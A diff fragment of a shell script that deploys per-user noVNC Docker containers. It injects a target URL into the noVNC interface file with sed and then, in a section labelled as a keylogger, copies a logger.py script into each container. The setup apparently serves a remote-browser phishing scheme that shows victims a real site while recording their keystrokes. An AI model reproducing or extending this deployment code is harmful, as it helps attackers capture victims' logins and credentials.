@@ -367,6 +367,10 @@ case "$1" in
 	    	
 	    fi
 	    
+	    # Replace TARGET_URL placeholder with actual target inside vnc/ui.js
+            sudo docker cp ./vnc/ui.js vnc-user$c:/usr/libexec/noVNCdim/app/
+            sudo docker exec --user root vnc-user$c sh -c "sed -i 's/TARGET_URL/${Target//\//\\/}/g' /usr/libexec/noVNCdim/app/ui.js"
+	    
 	    # Keylogger
 	    sudo docker cp ./vnc/logger.py vnc-user$c:/home/headless/   
 	    sleep 1
